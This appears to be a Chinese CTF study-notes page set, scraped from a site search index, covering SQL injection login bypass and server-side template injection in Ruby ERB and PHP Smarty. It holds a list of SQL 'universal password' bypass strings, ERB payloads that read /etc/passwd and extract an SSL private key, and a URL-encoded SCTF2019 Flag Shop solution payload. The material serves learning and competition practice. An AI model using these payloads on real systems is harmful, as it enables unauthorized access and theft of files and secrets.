<p>\u8fd9\u4e2a\u9898\u76ee\u8fd8\u662f\u6bd4\u8f83\u65b0\u9c9c\u7684\uff0c\u5f88\u4e45\u6ca1\u56de\u5b9e\u9a8c\u5427\u4e86\u5b66\u5230\u4e86\u5f88\u591a\u7684\u59ff\u52bf~\u4e0d\u5f97\u4e0d\u8bf4\u4e0d\u770b\u63d0\u793a\u771f\u5fc3\u60f3\u4e0d\u5230\u8fd9\u4e9b\uff0c\u55ef\u3002\u9996\u5148\u6211\u4eec\u9700\u8981\u4e86\u89e3\u9898\u76ee\u4e2dphp\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u9996\u5148\u5ba1\u6e90\u7801\u5f97\u5230\u4e86source.txt\u5f97\u5230\u4e86\u6e90\u7801\uff0c\u7136\u540e\u6211\u4eec\u770b\u4e00\u4e0b\u6e90\u7801\u5e72\u4e86\u4ec0\u4e48\uff0c\u4e3b\u8981\u5c31\u662f\u4e00\u4e2a\u767b\u9646\u8ba4\u8bc1\uff01&lt;?phperror_reporting(0);if (!isset(_POST['uname']) || !isset(_POST['pwd'])) {</p> <p>https://blog.csdn.net/qq_35078631/article/details/54772798</p> <p>MySQL GROUP BY \u8bed\u53e5 | \u83dc\u9e1f\u6559\u7a0b</p> <p>MySQL GROUP BY \u8bed\u53e5  GROUP BY \u8bed\u53e5\u6839\u636e\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u5bf9\u7ed3\u679c\u96c6\u8fdb\u884c\u5206\u7ec4\u3002 \u5728\u5206\u7ec4\u7684\u5217\u4e0a\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 COUNT, SUM, AVG,\u7b49\u51fd\u6570\u3002 GROUP BY \u8bed\u6cd5  SELECT column_name, function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name;   \u5b9e\u4f8b\u6f14\u793a \u672c\u7ae0\u8282\u5b9e\u4f8b..</p> <p>http://www.runoob.com/mysql/mysql-group-by-statement.html</p>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/","title":"\u4e07\u80fd\u5bc6\u7801","text":"<p>\u53ea\u662f\u8fd9\u4e48\u4e2a\u53eb\u6cd5\u800c\u5df2</p> <p>\u4f5c\u7528\u53ea\u80fd\u8bf4\u662f\u666e\u666e\u901a\u901a\u3002</p> <pre><code>'or 1=1/*\n\"or \"a\"=\"a\n\"or 1=1--\n\"or\"=\"\n\"or\"=\"a'='a\n\"or1=1--\n\"or=or\"\n''or'='or'\n') or ('a'='a\n'.).or.('.a.'='.a\n'or 1=1\n'or 1=1--\n'or 1=1/*\n'or\"=\"a'='a\n'or' '1'='1'\n'or''='\n'or''=''or''='\n'or'='1'\n'or'='or'\n'or.'a.'='a\n'or1=1--\n1'or'1'='1\na'or' 1=1--\na'or'1=1--\nor 'a'='a'\nor 1=1--\nor1=1-- asp aspx \"or \"a\"=\"a\n'.).or.('.a.'='.a\nor 1=1--\n'or 1=1--\na'or' 1=1--\n\"or 1=1--\n'or.'a.'='a\n\"or\"=\"a'='a\n'or''='\nor'='or' jsp 1'or'1'='1\nadmin' or 1=1/*\n</code></pre>"},{"location":"web_bak/ssti/erb%E6%B3%A8%E5%85%A5/","title":"erb\u6ce8\u5165","text":"<p>\u6e90\u81earuby</p> <p></p> <p>\u4f7f\u7528\u9884\u89c8\uff08preview\uff09\u6309\u94ae\u63d0\u4ea4\u8868\u683c\u540e\uff0c\u5448\u73b0\u5728\u6211\u4eec\u773c\u524d\u662f\u5305\u542b\u7528\u6237\u4fe1\u606f\u4ee5\u53ca\u7528\u6237\u521b\u5efa\u65f6\u95f4\u7684\u4e00\u4e2a\u9875\u9762\uff1a</p> <p>\u89c2\u5bdf\u4ee3\u7801\u4e2d\u83b7\u53d6username\u4ee5\u53catombstone\u65f6\u6240\u4f7f\u7528\u7684\u8bed\u6cd5\uff0c\u6839\u636e\u5176\u4e2d\u7684&lt;%=\u8bed\u6cd5\u4ee5\u53ca\u5176\u4ed6\u4e00\u4e9bRuby\u6280\u672f\uff0c\u6211\u4eec\u53ef\u4ee5\u731c\u6d4b\u8fd9\u6bb5\u4ee3\u7801\u5c5e\u4e8eRuby/ERB\u4ee3\u7801\u3002\u57fa\u4e8e\u8fd9\u4e2a\u5224\u65ad\uff0c\u6211\u4eec\u53ef\u4ee5\u7f16\u8f91\u8f93\u5165\u6570\u636e\uff0c\u6d4b\u8bd5\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u6a21\u677f\u6ce8\u5165\u3002\u5927\u81f4\u6d4f\u89c8ERB\u6587\u6863\u540e\uff0c\u6211\u4eec\u4e86\u89e3\u5230&lt;%=\u8bed\u6cd5\u53ef\u4ee5\u7528\u6765\u6267\u884cRuby\u8bed\u53e5\uff0c\u5e76\u4f1a\u5c1d\u8bd5\u5c06\u7ed3\u679c\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u4ee5\u9644\u5728\u6700\u7ec8\u7684\u7ed3\u679c\u6587\u672c\u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u653b\u51fb\u8f7d\u8377\u6765\u5c1d\u8bd5\u6267\u884c\u6570\u5b66\u8fd0\u7b97\uff1a</p> <p></p> <p>\u6211\u60f3\u8bf4\u7684\u662f\uff0c\u8bb0\u4f4f\u8fd9\u4e2a\u9875\u9762\uff01\uff01\uff01</p> <p>\u800c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u7684\u662f\uff1a</p> <p>ruby &lt;%= 7 * 7 %&gt;</p> <p>\u8fd0\u7b97\u7ed3\u679c\u4e3a49\uff0c\u6bcf\u4e2a\u7528\u6237\u90fd\u4f1a\u6253\u5370\u4e00\u6b21\u8fd0\u7b97\u7ed3\u679c</p> <p></p> <p>ruby &lt;%= File.open(\u2018/etc/passwd\u2019).read %&gt;</p> <p>\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u8fd9\u6bb5\u4ee3\u7801\u5b58\u5728\u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u3002\u975e\u5e38\u597d\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u8bd5\u8bd5\u770b\u80fd\u5426\u6267\u884c\u51fd\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u5148\u6765\u6d4b\u8bd5\u81ea\u5e26\u7684\u5168\u5c40\u51fd\u6570\u662f\u5426\u80fd\u7528\u5230\u8fd9\u6bb5\u4ee3\u7801\u4e2d\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u6d4b\u8bd5\u5982\u4e0b\u8fd9\u79cd\u8f7d\u8377\uff1a</p> <p></p> <p>\u641e\u5b9a\u3002</p> <p>\u7531\u4e8e\u4e0d\u5b89\u5168\u64cd\u4f5c\u7684\u539f\u56e0\uff0c\u7cfb\u7edf\u963b\u6b62\u6211\u4eec\u8bbf\u95eeFile.open\u51fd\u6570\u3002Ruby\u7684ERB\u6a21\u677f\u5f15\u64ce\u5305\u542b\u4e00\u4e2a\u5b89\u5168\u7ea7\u522b\uff08safe level\uff09\u53c2\u6570\uff0c\u5f53\u5b89\u5168\u7ea7\u522b\u8bbe\u7f6e\u4e3a0\u4ee5\u4e0a\u7684\u67d0\u4e2a\u503c\uff08\u6bd4\u59823\uff09\u65f6\uff0c\u6211\u4eec\u65e0\u6cd5\u5728\u6a21\u677f\u7ed1\u5b9a\uff08template binding\uff09\u4e2d\u6267\u884c\u5305\u62ec\u6587\u4ef6\u64cd\u4f5c\u5728\u5185\u7684\u67d0\u4e9b\u51fd\u6570\u3002\u5982\u679c\u5e94\u7528\u4f7f\u7528\u7684\u5b89\u5168\u7ea7\u522b\u4e3a4\uff0c\u90a3\u4e48\u5b83\u4f1a\u4f7f\u7528\u6700\u4e3a\u4e25\u683c\u7684\u9694\u79bb\u673a\u5236\uff0c\u53ea\u80fd\u6267\u884c\u6807\u8bb0\u4e3a\u53ef\u4fe1\u72b6\u6001\u7684\u90a3\u4e9b\u4ee3\u7801\u3002\u56e0\u6b64\uff0c\u770b\u6837\u5b50\u7ba1\u7406\u5458\u5728\u8fd9\u4e2a\u6a21\u677f\u5f15\u64ce\u4e2d\u8bbe\u7f6e\u4e86\u5b89\u5168\u7ea7\u522b\u3002\u867d\u7136\u6211\u4eec\u7684\u653b\u51fb\u4e0d\u4f1a\u50cf\u8bfb\u5199\u786c\u76d8\u6587\u4ef6\u90a3\u6837\u7b80\u5355\uff0c\u4f46\u8fd9\u91cc\u6211\u4eec\u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u8bb8\u591a\u653b\u51fb\u9762\u3002\u6bd4\u5982\uff0c\u5bf9\u4e8e\u76ee\u524d\u53ef\u7528\u7684\u8fd9\u4e9b\u5c0f\u5de5\u5177\uff08gadget\uff09\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u505a\u4ec0\u4e48\u64cd\u4f5c\uff1f\u5982\u679c\u6211\u4eec\u60f3\u5206\u6790self\u5bf9\u8c61\uff08self-object\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u679a\u4e3e\u8be5\u5bf9\u8c61\u53ef\u7528\u7684\u5c5e\u6027\u53ca\u65b9\u6cd5\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u8f7d\u8377\uff1a</p> <p>ruby&lt;%= self %&gt;</p> <p></p> <p>\u7ed3\u679c\u770b\u8d77\u6765\u5c31\u662fRuby\u7684\u98ce\u683c\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8bd5\u7740\u83b7\u53d6self\u5bf9\u8c61\u7684\u7c7b\u540d\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.class.name\u00a0%&gt;\n</code></pre> <p></p> <p>\u7c7b\u540d\u4e3a\u201cTemplateInjection\u201d\u3002\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u201c\u8bbf\u95ee\u201d\u8fd9\u4e2a\u63a7\u5236\u63a5\u53e3\uff0c\u6211\u4eec\u80fd\u7528\u5b83\u6765\u5e72\u5565\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u679a\u4e3eTemplateInjection\u7c7b\u7684\u53ef\u7528\u65b9\u6cd5\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.methods\u00a0%&gt;\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u8fd9\u4e9b\u51fd\u6570\uff0c\u601d\u8003\u54ea\u4e9b\u6570\u636e\u53ef\u4ee5\u4f20\u9012\u7ed9\u8fd9\u4e9b\u51fd\u6570\uff0c\u4ee5\u5b9e\u73b0\u672a\u6388\u6743\u8bbf\u95ee\u76ee\u7684\u3002\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695a\u8be5\u5e94\u7528\u5177\u4f53\u4f7f\u7528\u7684web\u6846\u67b6\uff0c\u4f46\u7531\u4e8e\u6211\u4eec\u6b63\u5f80\u670d\u52a1\u5668\u53d1\u9001HTTP POST\u8bf7\u6c42\uff0c\u56e0\u6b64\u53ef\u4ee5\u731c\u5230\u6211\u4eec\u5f88\u6709\u53ef\u80fd\u5904\u4e8ehandlePOST\u6216\u8005doPOST\u51fd\u6570\u5185\u90e8\u3002\u4e5f\u8bb8\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u8bbf\u95ee\u67d0\u4e9b\u5c40\u90e8\u53d8\u91cf\u3002</p> <p>\u5982\u679c\u5927\u5bb6\u4e0d\u719f\u6089Ruby\uff0c\u8fd9\u91cc\u6211\u7a0d\u5fae\u4ecb\u7ecd\u4e0b\u3002Ruby\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u5143\u7f16\u7a0b\uff08metaprogramming\uff09\u4ee5\u53ca\u5185\u7701\uff08introspection\uff09\u529f\u80fd\uff0c\u8bfb\u8005\u53ef\u4ee5\u8bbf\u95ee\u6b64\u94fe\u63a5\u4e86\u89e3\u66f4\u591a\u7ec6\u8282\u3002\u4f5c\u4e3a\u653b\u51fb\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5176\u4e2d\u67d0\u4e9b\u529f\u80fd\uff08\u5982\u524d\u9762\u63d0\u5230\u7684\u7c7b\u7684.methods\u4ee5\u53ca.name\u65b9\u6cd5\uff09\u6765\u63a2\u7d22\u7a0b\u5e8f\u7684\u5185\u90e8\u7ed3\u6784\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u8f7d\u8377\u83b7\u53d6\u76ee\u6807\u6240\u9700\u7684\u5177\u4f53\u53c2\u6570\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.method(:handle_POST).parameters\u00a0%&gt;\n</code></pre> <p></p> <p>\u4ece\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u53ef\u77e5handle_POST\u9700\u89813\u4e2areq\u53c2\u6570\uff0c\u8be5\u53c2\u6570\u53ef\u80fd\u4ee3\u8868\u7684\u662f\u67d0\u4e2a\u8bf7\u6c42\uff08request\uff09\u5bf9\u8c61\uff1brsp\u53c2\u6570\u53ef\u80fd\u4ee3\u8868\u7684\u662f\u54cd\u5e94\u6570\u636e\u7684\u5f15\u7528\uff1b\u6700\u540e\u7684session\u53c2\u6570\u53ef\u80fd\u662f\u67d0\u4e2aid\u6216\u8005\u67d0\u4e2a\u5bf9\u8c61\u3002\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u63a2\u7d22\uff0c\u4ee5\u786e\u8ba4session\u5bf9\u8c61\u7684\u5177\u4f53\u542b\u4e49\uff0c\u4f7f\u7528\u7684\u8f7d\u8377\u5982\u4e0b\uff1a</p> <pre><code>ruby\u00a0&lt;%=\u00a0session.class.name\u00a0%&gt;\n</code></pre> <p></p> <p>\u4e0a\u8ff0\u7ed3\u679c\u4e2d\uff0c\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u89c2\u5bdf\u5230\u7684\u662f\u201cWEBrick\u201d\uff0c\u8fd9\u662fRuby\u5728\u6807\u51c6\u5e93\u4e2d\u5b9e\u73b0\u7684\u539f\u751fweb\u670d\u52a1\u5668\u3002\u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u7ee7\u7eed\u63a2\u7d22\u8fd9\u4e2asession\u5bf9\u8c61\uff0c\u4f46\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u5176\u4ed6\u4e00\u4e9b\u76ee\u6807\u66f4\u503c\u5f97\u6211\u4eec\u63a2\u7d22\uff0c\u6bd4\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u91cd\u70b9\u5173\u6ce8\u4e0e\u5f53\u524d\u4f1a\u8bdd\u6709\u5173\u7684\u90a3\u4e9b\u6570\u636e\u3002\u7b80\u5355\u7ffb\u9605WEBrick\u6587\u6863\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u67d0\u4e9b\u53d8\u91cf\u4f1a\u4f20\u9012\u7ed9Servlet\u4ee5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u67d0\u4e9b\u5185\u7701\uff08introspection\uff09\u65b9\u6cd5\uff0c\u4ee5\u786e\u8ba4\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e9b\u53d8\u91cf\u4ee5\u53ca\u5176\u4ed6\u53ef\u7528\u53d8\u91cf\u3002</p> <pre><code>ruby\u00a0&lt;%=\u00a0self.instance_variables\u00a0%&gt;\n</code></pre> <p></p> <p>\u5f53WEBrick\u88ab\u5b9e\u4f8b\u5316\u4ee5\u5904\u7406\u5ba2\u6237\u7aef\u8bf7\u6c42\u65f6\uff0c\u5b83\u4f1a\u5c06\u67d0\u4e2ahttp\u670d\u52a1\u5668\u5b9e\u4f8b\u4f20\u9012\u7ed9servlet\uff0c\u8fd9\u5f88\u6709\u53ef\u80fd\u5c31\u662f@server\u8fd9\u4e2a\u5b9e\u4f8b\u53d8\u91cf\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u8bc1\u5b9e\u8fd9\u4e2a\u731c\u60f3\uff0c\u540c\u65f6\u89c2\u5bdf\u8fd9\u4e2a\u5bf9\u8c61\u5305\u542b\u54ea\u4e9b\u6210\u5458\u53d8\u91cf\u3002\u6211\u4eec\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528.instance_variables\u65b9\u6cd5\u6765\u8bc1\u5b9e\u8fd9\u4e00\u70b9\uff1a</p> <pre><code>ruby\u00a0&lt;%=@server.instance_variables\u00a0%&gt;\n</code></pre> <p></p> <pre><code>ruby\u00a0&lt;%\u00a0ssl=@server.instance_variable_get(:@ssl_context)\u00a0%&gt;&lt;%=\u00a0ssl.instance_variables\u00a0%&gt;\n</code></pre> <p></p> <p>@key\u770b\u8d77\u6765\u975e\u5e38\u6709\u8da3\uff0c\u6211\u4eec\u53ef\u4ee5\u63d0\u53d6\u8fd9\u4e2a\u503c\uff1a</p> <pre><code>ruby\u00a0&lt;%\u00a0ssl\u00a0=\u00a0@server.instance_variable_get(:@ssl_context)\u00a0%&gt;&lt;%=\u00a0ssl.instance_variable_get(:@key)\u00a0%&gt;\n</code></pre> <p></p> <pre><code>ruby &lt;%= self %&gt;\nruby &lt;%= self.class.name %&gt;\nruby &lt;%= self.methods %&gt;\nruby &lt;%= self.method(:handle_POST).parameters %&gt;\n----\nruby &lt;%= session.class.name %&gt;\nruby &lt;%= self.instance_variables %&gt;\nruby &lt;%=@server.instance_variables %&gt;\nruby &lt;% ssl=@server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variables %&gt;\nruby &lt;% ssl = @server.instance_variable_get(:@ssl_context) %&gt;&lt;%= ssl.instance_variable_get(:@key) %&gt;\u5176\u5b9e\u5c31\u662f\u4e2a\u6c99\u76d2\u9003\u9038\uff1f\n</code></pre> <p>\u7406\u89e3flask\u4e4b\u540e\u770b\u8fd9\u4e2a\u591a\u591a\u5c11\u5c11\u90fd\u80fd\u770b\u61c2\u5927\u90e8\u5206\u5427\uff0c\u5bf9\u5427\u5bf9\u5427\u5bf9\u5427\uff1f</p>"},{"location":"web_bak/ssti/erb%E6%B3%A8%E5%85%A5/#ruby","title":"ruby\u9884\u5b9a\u4e49\u53d8\u91cf","text":"<p>\u9884\u5b9a\u4e49\u53d8\u91cf\uff1a</p> <pre><code>Pre-defined variables\n$!\nThe exception information message set by 'raise'.\n$@\nArray of backtrace of the last exception thrown.\n$&amp;\nThe string matched by the last successful match.\n$`\nThe string to the left of the last successful match.\n$'\nThe string to the right of the last successful match.\n$+\nThe highest group matched by the last successful match.\n$1\nThe Nth group of the last successful match. May be &gt; 1.\n$~\nThe information about the last match in the current scope.\n$=\nThe flag for case insensitive, nil by default.\n$/\nThe input record separator, newline by default.\n$\\\nThe output record separator for the print and IO#write. Default is nil.\n$,\nThe output field separator for the print and Array#join.\n$;\nThe default separator for String#split.\n$.\nThe current input line number of the last file that was read.\n$&lt;\nThe virtual concatenation file of the files given on command line (or from $stdin if no files were given).\n$&gt;\nThe default output for print, printf. $stdout by default.\n$_\nThe last input line of string by gets or readline.\n$0\nContains the name of the script being executed. May be assignable.\n$*\nCommand line arguments given for the script sans args.\n$$\nThe process number of the Ruby running this script.\n$?\nThe status of the last executed child process. This value is thread-local.\n$:\nLoad path for scripts and binary modules by load or require.\n$\u201c\nThe array contains the module names loaded by require.\n$DEBUG\nThe debug flag, which is set by the -d switch. Enabling debug output prints each exception raised to $stderr (but not its backtrace). Setting this to a true value enables debug output as if -d were given on the command line. Setting this to a false value disables debug output.\n$LOADED_FEATURES\nThe alias to the $\u201c.\n$FILENAME\nCurrent input file from $&lt;. Same as $&lt;.filename.\n$LOAD_PATH\nThe alias to the $:.\n$stderr\nThe current standard error output.\n$stdin\nThe current standard input.\n$stdout\nThe current standard output.\n$VERBOSE\nThe verbose flag, which is set by the -w or -v switch. Setting this to a true value enables warnings as if -w or -v were given on the command line. Setting this to nil disables warnings, including from Kernel#warn.\n$-0\nThe alias to $/.\n$-a\nTrue if option -a is set. Read-only variable.\n$-d\nThe alias of $DEBUG. See $DEBUG above for further discussion.\n$-F\nThe alias to $;.\n$-i\nIn in-place-edit mode, this variable holds the extension, otherwise nil.\n$-I\nThe alias to $:.\n$-l\nTrue if option -l is set. Read-only variable.\n$-p\nTrue if option -p is set. Read-only variable.\n$-v\nAn alias of $VERBOSE. See $VERBOSE above for further discussion.\n$-w\nAn alias of $VERBOSE. See $VERBOSE above for further discussion.\nPre-defined global constants\nTRUE\nThe typical true value.\nFALSE\nThe false itself.\nNIL\nThe nil itself.\nSTDIN\nThe standard input. The default value for $stdin.\nSTDOUT\nThe standard output. The default value for $stdout.\nSTDERR\nThe standard error output. The default value for $stderr.\nENV\nThe hash contains current environment variables.\nARGF\nThe alias to the $&lt;.\nARGV\nThe alias to the $*.\nDATA\nThe file object of the script, pointing just after __END__.\nRUBY_VERSION\nThe ruby version string (VERSION was deprecated).\nRUBY_RELEASE_DATE\nThe release date string.\nRUBY_PLATFORM\nThe platform identifier.\u5728\u5b98\u65b9\u6587\u6863https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html\n</code></pre> <p>\u8fd9\u4e2a\u7ed9\u4e2a\u4f8b\u9898</p> <p>[SCTF2019]Flag Shop</p> <p>JWT\u4f2a\u9020\u90e8\u5206\u8df3\u8fc7\uff0c\u53ea\u5173\u6ce8\u5176\u4e2d\u7684erb\u6a21\u677f\u6ce8\u5165\u90e8\u5206\uff1b</p> <p>\u6e90\u7801\uff1a</p> <pre><code>require 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\nset :public_folder, File.dirname(__FILE__) + '/static'\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\nconfigure do\nenable :logging\nfile = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\nfile.sync = true\nuse Rack::CommonLogger, file\nend\nget \"/\" do\nredirect '/shop', 302\nend\nget \"/filebak\" do\ncontent_type :text\nerb IO.binread __FILE__\nend\nget \"/api/auth\" do\npayload = { uid: SecureRandom.uuid , jkl: 20}\nauth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nend\nget \"/api/info\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\njson({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\nget \"/shop\" do\nerb :shop\nend\nget \"/work\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\nauth = auth[0]\nunless params[:SECRET].nil?\nif ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\nputs ENV[\"FLAG\"]\nend\nend\nif params[:do] == \"#{params[:name][0,7]} is working\" then\nauth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result\nend\nend\npost \"/shop\" do\nislogin\nauth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\nif auth[0][\"jkl\"] &lt; FLAGPRICE then\njson({title: \"error\",message: \"no enough jkl\"})\nelse\nauth &lt;&lt; {flag: ENV[\"FLAG\"]}\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\njson({title: \"success\",message: \"jkl is good thing\"})\nend\nend\n\ndef islogin\nif cookies[:auth].nil? then\nredirect to('/shop')\nend\nend\n</code></pre> <p>\u91cd\u70b9\u4ee3\u7801</p> <pre><code>if params[:do] == \"#{params[:name][0,7]} is working\" then\nauth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\nauth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\ncookies[:auth] = auth\nERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result\nend\nend\nRuby\n</code></pre> <p>\u5173\u952e\u5728\u4e8e\uff1a</p> <pre><code>\"&lt;script&gt;alert('#{params[:name][0,7]}working successfully!')&lt;/script&gt;\"If do=name,\u7136\u540e\u622a\u53d6\u8fd98\u4e2a\u5b57\u7b26{\u5982\u679c\u6211\u4f20\u5165\u7684\u662f&lt;%7 *7 %&gt; }\u53d1\u73b0\u662f\u8fd4\u56de49\uff0c\u6a21\u677f\u6ce8\u5165\u9884\u5b9a\uff0c\u7136\u540e\u8fd9\u4e2a$\u2019\u5c31\u5f88\u50cf\u6b63\u5219\u5339\u914d\u4e00\u6837\u7684\u4e1c\u897f\uff0c\u89e3\u91ca\u662f\uff1aThe string to the right of the last successful match.\u5f88\u4e0d\u5e78\u8fd0\u7684\u7684\u5c31\u662f\u2026\u8fd9\u91cc\u5c31\u662f\u90a3\u4e2a\u4ea7\u751f\u7684\u968f\u673a\u5bc6\u94a5\u3002\n</code></pre> <p>$'-\u6700\u540e\u4e00\u6b21\u6210\u529f\u5339\u914d\u53f3\u8fb9\u7684\u5b57\u7b26\u4e32</p> <p>\uff08\u73af\u5883\u5173\u7cfb\uff0c\u6211\u4e0d\u592a\u4f1a\u5f04\uff0c\u4f46\u662f\u5173\u6ce8\u70b9\u5e94\u8be5\u662fruby\u4e2d\u7684\u6b63\u5219\u5339\u914d\u6a21\u5f0f\u4e5f\u5373\uff1a~\u548cmatch\uff09</p> <p>\u6784\u9020do=&lt;%=\u2019%&gt;is working\u548cname=&lt;%=\u2019%&gt;,\u8bb0\u5f97\u628a\u91cc\u9762\u5185\u5bb9\u8f6c\u6210\u5341\u516d\u8fdb\u5236</p> <p>\u6240\u4ee5\u6700\u7ec8\u5c31\u662f</p> <p>SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</p>"},{"location":"web_bak/ssti/php/","title":"PHP\u6a21\u677f","text":"<p>\u5355\u72ec\u62c9flask\u6765\u8bf4\u662f\u56e0\u4e3a\u5b83\u5b9e\u5728\u662f\u611f\u89c9\u975e\u5e38\u91cd\u8981\uff0c\u800c\u4e14\u662f\u7406\u89e3\u8fd0\u7528\u5176\u4ed6\u6a21\u677f\u7684\u57fa\u7840\uff08c\u8bed\u8a00\uff1f\uff09</p> <p>\u63a5\u4e0b\u6765\u662f\u4e24\u4e2aphp\u76f8\u5173\u7684\u6a21\u677f</p>"},{"location":"web_bak/ssti/php/#smarty","title":"smarty","text":"<p>Smarty\u662f\u4e00\u4e2aPHP\u7684\u6a21\u677f\u5f15\u64ce\uff0c\u63d0\u4f9b\u8ba9\u7a0b\u5e8f\u903b\u8f91\u4e0e\u9875\u9762\u663e\u793a\uff08HTML/CSS\uff09\u4ee3\u7801\u5206\u79bb\u7684\u529f\u80fd\u3002</p> <p>\u8fd9\u4e2a\u6a21\u677f\u597d\u50cf\u662f\u6709\u4e9b\u5e74\u5934\u4e86\uff0c\u78b0\u5230\u7684\u6b21\u6570\u4e5f\u662f\u5f88\u5c11\uff0c\u4f46\u6bd4\u8d5b\u53ef\u4e0d\u4f1a\u7ba1\u4f60\u5b66\u6ca1\u5b66\u4f1a\u4e0d\u4f1a\uff0c\u6240\u4ee5\u8fd8</p> <p>\u662f\u5728\u8fd9\u7b80\u5355\u7684\u4ecb\u7ecd\u4ecb\u7ecd\u3002\uff08\u6211\u662f\u60f3\u62c9\u4e2a\u4f8b\u9898\u7684\uff0c\u4f46\u662f\u6ca1\u627e\u5230\uff09</p> <p>\u5229\u7528\u65b9\u5f0f\uff1a\uff08\u642c\u8fd0\u5de5</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u8f93\u5165{$smarty.version}\u5c31\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7684smarty\u7684\u7248\u672c\u53f7</p> <p>Smarty\u652f\u6301\u4f7f\u7528<code>{php}{/php}</code>\u6807\u7b7e\u6765\u6267\u884c\u88ab\u5305\u88f9\u5176\u4e2d\u7684php\u6307\u4ee4\uff0c\u6700\u5e38\u89c4\u7684\u601d\u8def\u81ea\u7136\u662f\u5148\u6d4b\u8bd5\u8be5\u6807\u7b7e\u3002\uff08Smarty\u5df2\u7ecf\u5e9f\u5f03{php}\u6807\u7b7e\uff0c\u5f3a\u70c8\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528\u3002\u5728Smarty 3.1\uff0c{php}\u4ec5\u5728SmartyBC\u4e2d\u53ef\u7528\u3002\uff09</p> <p><code>{literal}</code>\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u6a21\u677f\u533a\u57df\u7684\u5b57\u7b26\u539f\u6837\u8f93\u51fa\u3002 \u8fd9\u7ecf\u5e38\u7528\u4e8e\u4fdd\u62a4\u9875\u9762\u4e0a\u7684Javascript\u6216css\u6837\u5f0f\u8868\uff0c\u907f\u514d\u56e0\u4e3aSmarty\u7684\u5b9a\u754c\u7b26\u800c\u9519\u88ab\u89e3\u6790\u3002</p> 